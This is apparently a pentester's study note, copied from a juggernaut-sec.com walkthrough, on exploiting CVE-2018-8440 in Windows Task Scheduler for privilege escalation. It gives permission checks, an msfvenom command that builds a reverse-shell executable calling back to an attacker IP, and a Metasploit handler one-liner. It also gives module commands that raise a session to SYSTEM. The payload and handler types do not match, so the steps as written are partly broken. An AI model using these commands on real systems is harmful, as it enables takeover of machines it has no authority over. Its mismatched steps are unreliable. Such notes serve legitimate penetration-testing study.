public:: true tags:: metasploit, windows, task, privesc

* \#+BEGIN_QUOTE *From [juggernaut-sec.com](https://juggernaut-sec.com/scheduled-tasks/#CVE-2018-8440_%E2%80%93_A_Scheduled_Task_Kernel_Exploit)* #+END_QUOTE
* `CVE-2018-8440` is a vulnerability that affects Windows versions up to 1803 as well as Windows Server 2008, 2012, and 2016.
* This exploit leverages **weak permissions** of the `C:\windows\tasks` folder as well as **a flaw** in the Task Scheduler API function “SchRpcSetSecurity”. Essentially, this flaw allows a standard user to call the API function and set file permissions on any local file they want.
* You need to check the `C:\Windows\Tasks` folder permissions using either `icacls` or `accesschk`. logseq.order-list-type:: number You need both *Read* and *Execute* as well as write permissions for the authenticated users group.
  * With `icacls` logseq.order-list-type:: number

    ```
    icacls "C:\Windows\Tasks"
    
    ```

    ![](https://juggernaut-sec.com/wp-content/uploads/2022/06/image-296.png)
  * With `accesschk` logseq.order-list-type:: number

    ```
    .\accesschk64.exe -wvud "C:\WIndows\Tasks"
    
    ```

    ![](https://juggernaut-sec.com/wp-content/uploads/2022/06/image-297.png)
* Exploit it via Metasploit logseq.order-list-type:: number
  * Create a payload with `mfsvenom` logseq.order-list-type:: number

    ```
    msfvenom \
    	-p windows/x64/shell_reverse_tcp \
        LHOST=172.16.1.30 \
        LPORT=443 \
        -a x64 \
        --platform Windows \
        -f exe \
        -o meterpreter64.exe
    
    ```
  * Upload the payload to the target machine logseq.order-list-type:: number
  * Start a mult-handler with `msfconsole` logseq.order-list-type:: number

    ```
    msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 172.16.1.30;set LPORT 443;exploit;"
    
    ```
  * From here we need to use the following commands to background our meterpreter session and load up the `CVE-2018-8440` module logseq.order-list-type:: number

    ```
    background
    search ALPC
    use 0
    set SESSION 1
    set LHOST 172.16.1.30
    set LPORT 8080
    
    ```

    ![](https://juggernaut-sec.com/wp-content/uploads/2022/06/image-301-1024x746.png)
  * Everything is set and all we need to do is issue the \*\*exploit \*\*command and we should see a second meterpreter session check in as SYSTEM logseq.order-list-type:: number ![](https://juggernaut-sec.com/wp-content/uploads/2022/06/image-302.png){:height 224, :width 747}